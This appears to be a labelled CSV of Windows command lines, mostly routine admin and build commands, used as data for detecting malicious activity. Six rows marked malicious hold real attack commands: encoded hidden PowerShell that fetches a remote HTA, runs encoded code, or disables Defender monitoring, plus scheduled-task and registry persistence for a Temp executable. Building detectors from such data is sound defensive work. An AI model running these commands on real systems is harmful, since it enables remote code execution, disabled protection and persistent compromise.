process_name,command_line,label
powershell.exe,Get-Service | Where-Object Status -eq Running,benign
git.exe,git commit -am 'chore: bump jq',benign
systeminfo.exe,systeminfo,benign
curl.exe,curl.exe -s http://localhost:5000/health,benign
powershell.exe,Get-Process | Sort-Object CPU -Descending | Select -First 10,benign
dotnet.exe,dotnet build infra.sln -c Release,benign
ipconfig.exe,ipconfig /all,benign
powershell.exe,powershell -nop -w hidden -enc bQBzAGgAdABhACAAaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4AMQA1ADkALwBpAC4AaAB0AGEA,malicious
git.exe,git status,benign
powershell.exe,Get-EventLog -LogName Application -Newest 20,benign
pip.exe,pip install -r requirements.txt,benign
powershell.exe,Get-ChildItem C:\Users\backupadmin\Documents,benign
sqlcmd.exe,"sqlcmd -S db -d nginx -Q ""SELECT COUNT(*) FROM dbo.Orders""",benign
tasklist.exe,tasklist /fo table,benign
sc.exe,sc query api-gateway,benign
kubectl.exe,kubectl get pods -n production,benign
nuget.exe,nuget restore data-pipeline.sln,benign
git.exe,git pull origin hotfix/login,benign
git.exe,git commit -am 'chore: bump openjdk-17-jdk',benign
robocopy.exe,robocopy C:\build\dist \\web\redis /MIR /NFL,benign
docker.exe,docker build -t worker:16 .,benign
powershell.exe,powershell -nop -w hidden -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAHcAIABoAGkAZABkAGUAbgAgAC0AZQBuAGMAIABTAFEAQgBGAEEARgBnAEEASQBBAEEAbwBBAEcANABBAFoAUQBCADMAQQBDADAAQQBiAHcAbgA=,malicious
powershell.exe,Test-Connection -Count 2 db-45,benign
where.exe,where python,benign
python.exe,python -m pytest tests\ -q,benign
dotnet.exe,dotnet test,benign
git.exe,git commit -am 'chore: bump python3-pip',benign
schtasks.exe,schtasks /create /sc minute /mo 10 /tn UpdateSync /tr C:\Windows\Temp\telemetry.exe /f,malicious
nuget.exe,nuget restore billing-service.sln,benign
dotnet.exe,dotnet build billing-service.sln -c Release,benign
robocopy.exe,robocopy C:\build\dist \\web\payments /MIR /NFL,benign
docker.exe,docker build -t postgres:57 .,benign
robocopy.exe,robocopy C:\build\dist \\web\search /MIR /NFL,benign
powershell.exe,Restart-Service -Name auth-svc,benign
nuget.exe,nuget restore mobile-api.sln,benign
powershell.exe,Test-Connection -Count 2 db-79,benign
sqlcmd.exe,"sqlcmd -S db -d api-gateway -Q ""SELECT COUNT(*) FROM dbo.Orders""",benign
explorer.exe,explorer C:\Users\backupadmin\Downloads,benign
msbuild.exe,msbuild /t:Rebuild /p:Configuration=Release,benign
reg.exe,reg add HKLM\System\CurrentControlSet\Services\Upd /v ImagePath /d C:\Windows\Temp\telemetry.exe /f,malicious
git.exe,git pull origin develop,benign
sc.exe,sc query postgres,benign
net.exe,net use Z: \\fileserver\share,benign
powershell.exe,Restart-Service -Name redis,benign
docker.exe,docker ps -a,benign
powershell.exe,powershell -nop -w hidden -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAGMAIABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA==,malicious
powershell.exe,Test-Connection -Count 2 db-18,benign
powershell.exe,Test-Connection -Count 2 db-72,benign
docker.exe,docker build -t worker:38 .,benign
powershell.exe,Restart-Service -Name search,benign
robocopy.exe,robocopy C:\build\dist \\web\worker /MIR /NFL,benign
powershell.exe,Test-Connection -Count 2 db-30,benign
powershell.exe,Restart-Service -Name api-gateway,benign
sqlcmd.exe,"sqlcmd -S db -d search -Q ""SELECT COUNT(*) FROM dbo.Orders""",benign
git.exe,git pull origin release/2.4,benign
choco.exe,choco install openjdk-17-jdk -y,benign
sc.exe,sc query nginx,benign
nuget.exe,nuget restore web-app.sln,benign
powershell.exe,Test-Connection -Count 2 db-11,benign
robocopy.exe,robocopy C:\build\dist \\web\nginx /MIR /NFL,benign
git.exe,git commit -am 'chore: bump htop',benign
powershell.exe,Test-Connection -Count 2 db-15,benign
dotnet.exe,dotnet build platform.sln -c Release,benign
net.exe,net view /all,malicious
